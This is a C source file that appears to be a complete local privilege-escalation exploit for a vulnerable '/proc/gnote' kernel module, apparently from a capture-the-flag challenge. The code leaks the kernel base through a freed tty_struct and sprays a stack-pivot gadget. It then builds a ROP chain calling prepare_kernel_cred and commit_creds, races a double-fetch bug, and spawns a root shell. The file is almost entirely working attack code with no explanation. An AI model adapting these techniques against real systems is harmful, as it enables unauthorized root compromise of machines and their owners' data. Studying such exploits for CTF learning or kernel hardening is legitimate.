#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <errno.h>
#include <linux/fs.h>
#include <semaphore.h>
#include <sys/prctl.h>
#include <sys/timerfd.h>
#include <sys/reg.h>

#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE);\
                        }while(0)

#define TRYTIMES 0x1000 
#define GADGETPAGE 0xc0000000

int fd;
int finish=0;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

void spawn_shell()
{
    if(!getuid())
    {
        finish = 1;
        system("/bin/sh");
    }
    else
    {
        puts("[*]spawn shell error!");
    }
    exit(0);
}

ssize_t gnote_write(void *buf)
{
    return write(fd, (char *)buf, 0x100);
}

ssize_t gnote_read(void *buf, size_t count)
{
    return read(fd, (char *)buf, count);
}

struct arg_in {
    unsigned int cmd;
    unsigned int num;
};

struct arg_in arg;

void *change_cmd(void *args)
{
    while(finish == 0)
        arg.cmd = 0x20000000;
    puts("race won!");
    return NULL;
}

void hexdump(char *buf, uint64_t size)
{
    for(int i=0; i<size; i+=0x10)
        printf("+%x:0x%lx       +%x:0x%lx\n", i, *(uint64_t*)(buf+i), i+8, *(uint64_t *)(buf+i+8));
}

int main()
{
    pthread_t th1;
    uint64_t kbase;
    uint64_t offset;
    uint64_t xchg_eax_esp;
    uint64_t pop_rdi_ret = 0xffffffff8101c20d;
    uint64_t mov_cr4_rdi_pop_rbp_ret = 0xffffffff8103ef24;
    uint64_t prepare_kernel_cred = 0xffffffff81069fe0;
    uint64_t pop_rsi_ret = 0xffffffff81037799;
    uint64_t mov_rdi_rax_pop_rbp_ret = 0xFFFFFFFF8121CA6A;
    uint64_t commit_creds = 0xffffffff81069df0;
    uint64_t swapgs_pop_ret = 0xffffffff8103efc4;
    uint64_t popfq_ret = 0xffffffff810209f1;
    uint64_t iretq_pop_ret = 0xffffffff8101dd06;
    uint64_t swrr_r2u = 0xffffffff81600a4a;
    int tfd;
    char buf[0x1000];
    struct arg_in temp;
    save_status();
    if ((fd=open("/proc/gnote", O_RDWR)) == -1)
        errExit("open gnote");

    if ((tfd=open("/dev/ptmx", O_RDWR)) == -1)
        errExit("open ptmx");

    uint64_t gadget = (uint64_t)mmap((void *)GADGETPAGE, 0x1000000, PROT_READ | PROT_WRITE, 
            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (gadget != GADGETPAGE)
        errExit("mmap gadget");

    // 获得free后的tty_struct
    temp.cmd = 1;
    temp.num = 0x2e0;
    close(tfd);
    gnote_write(&temp);
    
    // 选中
    temp.cmd = 5;
    temp.num = 0;
    gnote_write(&temp);

    // 提取地址
    memset(buf, 0, sizeof(buf));
    gnote_read(buf, 0x2e0);
    kbase = *(uint64_t *)(buf + 0x2b0) - 0xffffffff812ac7d0 + 0xffffffff81000000;
    offset = kbase - 0xffffffff81000000; 
    printf("[*] kernelbase: %lx\n", kbase);
    xchg_eax_esp = kbase + 0x1992a;
    

    // 部署rop
    for(int i=0; i<0x1000000-0x8; i+=8)
        *(uint64_t *)(gadget + i) = xchg_eax_esp;
    
    uint64_t roppage = xchg_eax_esp & 0xffffffff;
    uint64_t *rop = (uint64_t *)roppage;
    roppage = roppage & 0xfffff000;
    if((uint64_t)mmap((void*)roppage, 0x3000, PROT_READ | PROT_WRITE, 
            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != roppage)
        errExit("mmap roppage");
    
    int i=0;
    rop[i++] = pop_rdi_ret + offset; 
    rop[i++] = 0 ;
    rop[i++] = prepare_kernel_cred + offset;
    rop[i++] = pop_rsi_ret + offset;
    rop[i++] = -1;
    rop[i++] = mov_rdi_rax_pop_rbp_ret + offset;
    rop[i++] = 0;
    rop[i++] = commit_creds + offset;
    //rop[i++] = swapgs_pop_ret + offset;
    //rop[i++] = 0;
    //rop[i++] = popfq_ret + offset;
    //rop[i++] = 0;
    //rop[i++] = iretq_pop_ret + offset;
    rop[i++] = swrr_r2u + offset;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = (uint64_t)spawn_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    // double fetch
    arg.cmd = 2;
    arg.num = 0xdeadbeaf;
    pthread_create(&th1, NULL, &change_cmd, NULL);
    for(int i=0; i<TRYTIMES && !finish; i++)
    {
        gnote_write(&arg);
        arg.cmd = 2; 
    }
    return 0;
}
